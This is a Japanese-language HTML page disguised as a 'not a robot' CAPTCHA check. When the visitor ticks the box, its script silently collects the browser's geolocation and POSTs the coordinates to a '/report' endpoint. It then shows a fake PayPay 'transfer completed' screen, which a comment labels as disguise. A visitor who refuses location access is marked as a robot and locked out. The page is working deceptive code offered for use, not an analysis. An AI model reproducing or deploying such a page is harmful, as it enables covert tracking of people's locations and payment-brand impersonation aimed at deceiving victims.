<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>ロボット確認</title>
  <style>
    body {
      text-align: center;
      margin-top: 100px;
      font-family: sans-serif;
    }
    #robot-message {
      display: none;
    }
    #main-content {
      display: block;
    }
  </style>
</head>
<body>
  <div id="robot-message">
    <h2>ロボットと判明したため、このサービスはご利用いただけません。</h2>
  </div>

  <div id="main-content">
    <h2>ロボットでないことを確認してください</h2>
    <input type="checkbox" id="check">
    <label for="check">私はロボットではありません</label>
  </div>

  <script>
    if (localStorage.getItem('robot') === 'true') {
      document.getElementById('main-content').style.display = 'none';
      document.getElementById('robot-message').style.display = 'block';
    } else {
      document.getElementById('check').addEventListener('change', () => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(pos => {
            fetch('/report', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude
              })
            }).then(() => {
              // ✅ PayPay風の完了画面へ遷移（偽装）
              document.body.innerHTML = `
                <img src="https://www.paypay.ne.jp/img/logo.svg" width="150"><br><br>
                <h2>送金が完了しました</h2>
                <p>ありがとうございました。</p>
              `;
            });
          }, err => {
            alert('位置情報が取得できませんでした。');
            localStorage.setItem('robot', 'true');
            location.reload();
          });
        } else {
          alert('このブラウザでは位置情報が使用できません。');
          localStorage.setItem('robot', 'true');
          location.reload();
        }
      });
    }
  </script>
</body>
</html>
